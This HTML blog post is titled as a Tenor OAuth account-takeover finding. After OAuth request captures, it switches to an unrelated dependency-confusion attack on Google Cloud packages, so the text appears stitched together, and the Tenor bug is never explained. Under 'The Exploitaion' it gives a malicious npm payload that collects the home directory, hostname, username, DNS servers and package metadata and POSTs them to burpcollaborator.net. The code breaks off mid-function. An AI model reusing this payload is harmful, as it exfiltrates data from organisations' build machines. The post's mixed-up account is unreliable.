<!doctype html><html lang=en><head><title>All Accounts Takeover On Tenor Due to No Authorization Of Oauth Token üçÅ ::
0xdroopy ‚Äî Lets Hack for Good!</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction # Hey, People hope you all are doing well! It is been a great time since we met through our daily blogs of my findings on certain programs. For the last three months, I have been stuck to the Google VRP and found something really interesting and critical. The reason I wanted to write about this is because of how much fun I had finding it. This was an unexpected find that caught my attention while testing one of the big acquisitions owned by Google LLC."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://bugs.0xdroopy.live/unauthorization-of-oauth-token-leads-to-full-account-takeover-on-tenor/><link rel=stylesheet href=https://bugs.0xdroopy.live/assets/style.css><link rel=stylesheet href=https://bugs.0xdroopy.live/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://bugs.0xdroopy.live/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=https://bugs.0xdroopy.live/img/favicon.png><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=https://bugs.0xdroopy.live/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary"><meta name=twitter:title content="All Accounts Takeover On Tenor Due to No Authorization Of Oauth Token üçÅ"><meta name=twitter:description content="Introduction # Hey, People hope you all are doing well! It is been a great time since we met through our daily blogs of my findings on certain programs. For the last three months, I have been stuck to the Google VRP and found something really interesting and critical. The reason I wanted to write about this is because of how much fun I had finding it. This was an unexpected find that caught my attention while testing one of the big acquisitions owned by Google LLC."><meta property="og:title" content="All Accounts Takeover On Tenor Due to No Authorization Of Oauth Token üçÅ"><meta property="og:description" content="Introduction # Hey, People hope you all are doing well! It is been a great time since we met through our daily blogs of my findings on certain programs. For the last three months, I have been stuck to the Google VRP and found something really interesting and critical. The reason I wanted to write about this is because of how much fun I had finding it. This was an unexpected find that caught my attention while testing one of the big acquisitions owned by Google LLC."><meta property="og:type" content="article"><meta property="og:url" content="https://bugs.0xdroopy.live/unauthorization-of-oauth-token-leads-to-full-account-takeover-on-tenor/"><meta property="article:section" content><meta property="article:published_time" content="2022-03-12T00:00:00+00:00"><meta property="article:modified_time" content="2022-03-12T00:00:00+00:00"><meta property="og:site_name" content="0xdroopy"></head><body><div class=container><header class=header><span class=header__inner><a href=https://home.0xdroopy.live class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>root@0xdroopy</span>
<span class=logo__cursor></span></a>
<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/bugs>post</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/bugs>post</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>All Accounts Takeover On Tenor Due to No Authorization Of Oauth Token üçÅ</h1><div class=post-meta><span class=post-date>2022-03-12</span>
<span class=post-author>‚Äî Written by 0xdroopy</span></div><div class=post-content><h2 id=introduction>Introduction
<a href=#introduction class=h-anchor aria-hidden=true>#</a></h2><p>Hey, People hope you all are doing well! It is been a great time since we met through our daily blogs of my findings on certain programs. For the last three months, I have been stuck to the Google VRP and found something really interesting and critical. The reason I wanted to write about this is because of how much fun I had finding it. This was an unexpected find that caught my attention while testing one of the big acquisitions owned by Google LLC. which is a famous Gif solution named Tenor.
Please note that Tenor has passed its 6 month blackout period which is described by the Google allowing it to go for monetary rewards.</p><h2 id=story>Story
<a href=#story class=h-anchor aria-hidden=true>#</a></h2><p>I was looking at one of the acquisitions owned by Google Inc. lately in 2016. After all, recognizing it as a rewardable asset, I began hunting on it. After a bit of observation, I stopped at the Oauth Flow which got my attention even more. After some requests, it came to notice for me that a serious misconfiguration is going on which was helpful for the attacker to take over every single account on tenor.com.</p><img src=https://momreadit.files.wordpress.com/2021/04/hello-garden-1.jpg alt="Hello Friend" class=center style=border-radius:8px><p>This was an really unexpected as well as very interesting find and has severly impact on the users as well as developers using it in order to make, upload and create the awesome gifs. In order to exploit you should need to deep dive in the requests made during logging in the account on tenor.com using an OAuth functionality.</p><h2 id=how-oauth-flow-works>How Oauth Flow Works?
<a href=#how-oauth-flow-works class=h-anchor aria-hidden=true>#</a></h2><img src=https://docs.oracle.com/cd/E82085_01/160023/JOS%20Implementation%20Guide/Output/img/oauth2-caseflow.png alt="Hello Friend" class=center style=border-radius:8px><p>Oauth is a simple functionality used in many applications in order to make them signing with the existing account on certain platforms. Google has one of the most famous Oauth which works in almost every application we see in our day to day needs. Oauth flow has a very systematic and a secure way to make and create the account on specific platforms. There are many oauth functionalities present, but here we are going to talk about the one which Tenor uses - Authorization Code.</p><h4 id=while-clicking-sign-in-with-google>While Clicking Sign In With Google
<a href=#while-clicking-sign-in-with-google class=h-anchor aria-hidden=true>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>GET /o/oauth2/auth?redirect_uri=storagerelay%3A%2F%2Fhttps%2Ftenor.com%3Fid%3Dauth251216&amp;response_type=permission%20id_token&amp;scope=email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Ftenor&amp;openid.realm=&amp;include_granted_scopes=true&amp;client_id=XXXXXXXXXXXXXXXXXXXXXX HTTP/2
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Host: accounts.google.com
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept-Language: en-US,en;q=0.5
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept-Encoding: gzip, deflate
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Referer: https://tenor.com/
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Dnt: 1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Upgrade-Insecure-Requests: 1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Dest: document
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Mode: navigate
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Site: cross-site
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Te: trailers
</span></span></span></code></pre></div><h4 id=selecting-google-account>Selecting Google Account
<a href=#selecting-google-account class=h-anchor aria-hidden=true>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>GET /o/oauth2/iframerpc?action=issueToken&amp;response_type=token%20id_token&amp;login_hint=AJDLj6JXrAdwGc8b9pldZZaLHnjbRv3xVIz49lxCkoyi6HA9WkOQWbSqF0MrONvcPKEhKZWphhY294SMOezVRY7_j32MAaN6SQ&amp;client_id=598652403343-harjvt5thjol9qjkrfqpmb7njrnek80v.apps.googleusercontent.com&amp;origin=https%3A%2F%2Ftenor.com&amp;scope=email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Ftenor&amp;ss_domain=https%3A%2F%2Ftenor.com&amp;include_granted_scopes=true HTTP/2
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Host: accounts.google.com
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Cookie: __Host-GAPS=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept: */*
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept-Language: en-US,en;q=0.5
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Accept-Encoding: gzip, deflate
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>X-Requested-With: XmlHttpRequest
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Dnt: 1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Referer: https://accounts.google.com/o/oauth2/iframe
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Dest: empty
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Mode: cors
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Sec-Fetch-Site: same-origin
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Te: trailers
</span></span></span></code></pre></div><h4 id=response-from-the-server-with-request-of-oauth-token>Response from the server with request of Oauth Token
<a href=#response-from-the-server-with-request-of-oauth-token class=h-anchor aria-hidden=true>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /keyboard.login <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>api-v1.tenor.com</span>
</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0</span>
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>:</span> <span style=color:#ae81ff>*/*</span>
</span></span><span style=display:flex><span>Accept-Language<span style=color:#f92672>:</span> <span style=color:#ae81ff>en-US,en;q=0.5</span>
</span></span><span style=display:flex><span>Accept-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate</span>
</span></span><span style=display:flex><span>Referer<span style=color:#f92672>:</span> <span style=color:#ae81ff>https://tenor.com/</span>
</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>application/x-www-form-urlencoded</span>
</span></span><span style=display:flex><span>Origin<span style=color:#f92672>:</span> <span style=color:#ae81ff>https://tenor.com</span>
</span></span><span style=display:flex><span>Content-Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>997</span>
</span></span><span style=display:flex><span>Dnt<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec-Fetch-Dest<span style=color:#f92672>:</span> <span style=color:#ae81ff>empty</span>
</span></span><span style=display:flex><span>Sec-Fetch-Mode<span style=color:#f92672>:</span> <span style=color:#ae81ff>cors</span>
</span></span><span style=display:flex><span>Sec-Fetch-Site<span style=color:#f92672>:</span> <span style=color:#ae81ff>same-site</span>
</span></span><span style=display:flex><span>Te<span style=color:#f92672>:</span> <span style=color:#ae81ff>trailers</span>
</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gaia_token=&lt;Oauth-Token&gt;
</span></span></code></pre></div><h2 id=whats-there-in-these-requests-to-notice>Whats There In These Requests To Notice?
<a href=#whats-there-in-these-requests-to-notice class=h-anchor aria-hidden=true>#</a></h2><img src="https://cdn11.bigcommerce.com/s-jyvxk5hzsq/images/stencil/1280x1280/products/6029/44001/6751L__24754.1539348498.jpg?c=2s" alt="Hello Friend" class=center style=border-radius:8px><p><a href=https://pypi.org><strong>Pypi</strong></a> is a platform where you can upload various packages on your own based on python framework.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pathlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> setuptools <span style=color:#f92672>import</span> setup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># The directory containing this file</span>
</span></span><span style=display:flex><span>HERE <span style=color:#f92672>=</span> pathlib<span style=color:#f92672>.</span>Path(__file__)<span style=color:#f92672>.</span>parent
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># The text of the README file</span>
</span></span><span style=display:flex><span>README <span style=color:#f92672>=</span> (HERE <span style=color:#f92672>/</span> <span style=color:#e6db74>&#34;README.md&#34;</span>)<span style=color:#f92672>.</span>read_text()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># This call to setup() does all the work</span>
</span></span><span style=display:flex><span>setup(
</span></span><span style=display:flex><span>    name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;realpython-reader&#34;</span>,
</span></span><span style=display:flex><span>    version<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.0.0&#34;</span>,
</span></span><span style=display:flex><span>    description<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Read the latest Real Python tutorials&#34;</span>,
</span></span><span style=display:flex><span>    long_description<span style=color:#f92672>=</span>README,
</span></span><span style=display:flex><span>    long_description_content_type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/markdown&#34;</span>,
</span></span><span style=display:flex><span>    url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://github.com/realpython/reader&#34;</span>,
</span></span><span style=display:flex><span>    author<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Real Python&#34;</span>,
</span></span><span style=display:flex><span>    author_email<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;info@realpython.com&#34;</span>,
</span></span><span style=display:flex><span>    license<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;MIT&#34;</span>,
</span></span><span style=display:flex><span>    classifiers<span style=color:#f92672>=</span>[
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;License :: OSI Approved :: MIT License&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Programming Language :: Python :: 3&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Programming Language :: Python :: 3.7&#34;</span>,
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    packages<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;reader&#34;</span>],
</span></span><span style=display:flex><span>    include_package_data<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>    install_requires<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;feedparser&#34;</span>, <span style=color:#e6db74>&#34;html2text&#34;</span>],
</span></span><span style=display:flex><span>    entry_points<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;console_scripts&#34;</span>: [
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;realpython=reader.__main__:main&#34;</span>,
</span></span><span style=display:flex><span>        ]
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><h3 id=npm>Npm
<a href=#npm class=h-anchor aria-hidden=true>#</a></h3><p>Similarly in Node Js there is a platform name <a href=https://www.npmjs.com/><strong>Npm</strong></a> which allows the user to upload open source packages.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// module.exports exports the function getContests as a promise and exposes it as a module.
</span></span></span><span style=display:flex><span><span style=color:#75715e>// we can import an exported module by using require().
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getContests</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>axios</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;axios&#34;</span>); <span style=color:#75715e>// Importing the Axios module to make API requests
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>result</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span>; <span style=color:#75715e>// Insert Your Username here
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>api_key</span>; <span style=color:#75715e>//Insert API key here
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>axios</span> <span style=color:#75715e>// Making a GET request using axios and requesting information from the API
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    .<span style=color:#a6e22e>get</span>(
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;https://clist.by/api/v1/json/contest/?username=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&amp;api_key=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>api_key</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&amp;limit=20&amp;end__gt=2020-09-19T00%3A00%3A00&#34;</span>
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    .<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>response</span>) =&gt; { <span style=color:#75715e>// If the GET request is successful, this block is executed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>response</span>; <span style=color:#75715e>// The response of the API call is passed on to the next block
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    })
</span></span><span style=display:flex><span>    .<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>contests</span>) =&gt; { <span style=color:#75715e>// In this block, we store the response data into a variable &#39;result&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>contests</span>.<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>objects</span>;
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>catch</span>((<span style=color:#a6e22e>err</span>) =&gt; {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>err</span>); <span style=color:#75715e>// Error handler
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    });
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>result</span>; <span style=color:#75715e>// The contest data is returned
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
</span></span></code></pre></div><h3 id=private-packages>Private Packages
<a href=#private-packages class=h-anchor aria-hidden=true>#</a></h3><p>Bigger organisations like Google, Facebook, Apple make their own packages for their company by which their systems communicate and download internally. Usually these are done in order to mantain the privacy to the sensitive content in the organisation. The Private Package looks like-</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>pip install --index-ur<span style=color:#f92672>=</span>https://pip.company.com/ company-oauth
</span></span></code></pre></div><h3 id=combined-packages>Combined Packages
<a href=#combined-packages class=h-anchor aria-hidden=true>#</a></h3><p>Not to our surprise there is a third category as well which allows the system to use both Public and Private packages giving us Combined Packages. These packages have a catch, they have to decide which package to decide. They usually go for this type of package which has a higher version as they didnt want to install the updated library for their system again and again.</p><img src=https://docstore.mik.ua/orelly/oracle/prog2/figs/sql2.1603.gif alt="Hello Friend" class=center style=border-radius:8px><h2 id=whats-the-bug-here>What&rsquo;s the Bug here?
<a href=#whats-the-bug-here class=h-anchor aria-hidden=true>#</a></h2><p>The combined Packages which we talked about recently makes the things more interesting and exploitable. What attacker&rsquo;s do is make the package of same name on the open-source platform with malicious code in it. By which when the system from the organization tries to access the package . Now the distinctive nature comes about JFrog Artifactory ,which makes the system to choose the package with the higher version rather than the package on the same system. The attacker&rsquo;s upload the package with identical name with higher version than the internal package which makes the system or api to catch the pipeline of package having higher version.</p><img src=https://raw.githubusercontent.com/NikhilkaushikOp/bugs-by-nikhil-kaushik/main/Repeater%20%284%29.png alt="Hello Friend" class=center style=border-radius:8px><h2 id=ah-the-recon>Ah! The Recon!
<a href=#ah-the-recon class=h-anchor aria-hidden=true>#</a></h2><p>In order to perform the recon I first wanted to know where and which the packages lie. Google Cloud Services uses packages which are not listed anywhere in the ocean of internet. I go throughed all the documentation of all the products in the Cloud Service but didn&rsquo;t have any clue about the heavy weight packages. Now my inner brain says lets go for Github Recon. After spending about 2 Hours it failed. Google dosen&rsquo;t save their information on Github at all. Now what I have to do is simply and most efficient which works for me - Automation! I have made many of the tools on my own , I will make them public after I give them a final touch. I began scanning the packages on all the products of Google Cloud Services. I slept at night making my VPS a kickstart. When I woked up early in morning, I was surprised. The Vps has almost found out 20-25 packages. Now I immediately have to see which one is private, public and combined. There were all types of packages including python and node.js.</p><h2 id=the-exploitaion>The Exploitaion
<a href=#the-exploitaion class=h-anchor aria-hidden=true>#</a></h2><p>After investigating, I found out that the Combined packages were total of 9. Among which there were 5 python and 4 npm packages. I quickly went to the open-source programs listed before and quickly started searching which packages are missing and which are not? After a while , I founded Out of 9 only one package is missing on the platform. I quickly made a package with the same name of the package and wrote my Remote Code Execution Code below-</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//author:- mypackage@protonmail.com
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> os <span style=color:#f92672>=</span> require<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> dns <span style=color:#f92672>=</span> require<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;dns&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> querystring <span style=color:#f92672>=</span> require<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;querystring&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> https <span style=color:#f92672>=</span> require<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;https&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> packageJSON <span style=color:#f92672>=</span> require<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;./package.json&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#f92672>package</span> <span style=color:#960050;background-color:#1e0010>= </span>packageJSON.name<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> trackingData <span style=color:#f92672>=</span> JSON<span style=color:#f92672>.</span><span style=color:#a6e22e>stringify</span><span style=color:#f92672>({</span>
</span></span><span style=display:flex><span>    p<span style=color:#f92672>:</span> package<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    c<span style=color:#f92672>:</span> __dirname<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    hd<span style=color:#f92672>:</span> os<span style=color:#f92672>.</span><span style=color:#a6e22e>homedir</span><span style=color:#f92672>(),</span>
</span></span><span style=display:flex><span>    hn<span style=color:#f92672>:</span> os<span style=color:#f92672>.</span><span style=color:#a6e22e>hostname</span><span style=color:#f92672>(),</span>
</span></span><span style=display:flex><span>    un<span style=color:#f92672>:</span> os<span style=color:#f92672>.</span><span style=color:#a6e22e>userInfo</span><span style=color:#f92672>().</span><span style=color:#a6e22e>username</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    dns<span style=color:#f92672>:</span> dns<span style=color:#f92672>.</span><span style=color:#a6e22e>getServers</span><span style=color:#f92672>(),</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>:</span> packageJSON <span style=color:#f92672>?</span> packageJSON<span style=color:#f92672>.</span><span style=color:#a6e22e>___resolved</span> <span style=color:#f92672>:</span> undefined<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    v<span style=color:#f92672>:</span> packageJSON<span style=color:#f92672>.</span><span style=color:#a6e22e>version</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    pjson<span style=color:#f92672>:</span> packageJSON<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>var postData <span style=color:#f92672>=</span> querystring<span style=color:#f92672>.</span><span style=color:#a6e22e>stringify</span><span style=color:#f92672>({</span>
</span></span><span style=display:flex><span>    msg<span style=color:#f92672>:</span> trackingData<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>var options <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    hostname<span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;burpcollaborator.net&#34;</span><span style=color:#f92672>,</span> <span style=color:#75715e>//replace burpcollaborator.net with Interactsh or pipedream
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    port<span style=color:#f92672>:</span> 443<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    path<span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    method<span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;POST&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    headers<span style=color:#f92672>:</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Content-Type&#34;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;application/x-www-form-urlencoded&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Content-Length&#34;</span><span style=color:#f92672>:</span> postData<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>},</span>
</span></span><span style=display:flex><span><span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>var req <span style=color:#f92672>=</span> https<span style=color:#f92672>.</span><span style=color:#a6e22e>request</span><span style=color:#f92672>(</span>options<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>res<span style=color:#f92672>)</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    res<span style=color:#f92672>.</span><span style=color:#a6e22e>on</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;data&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span>d<span style=color:#f92672>)</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        process<span style=color:#f92672>.</span><span style=color:#a6e22e>stdout</span><span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>d<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>});</span>
</span></span><span style=display:flex><span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>on</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;error&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span>e<span style=color:#f92672>)</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>{</span>
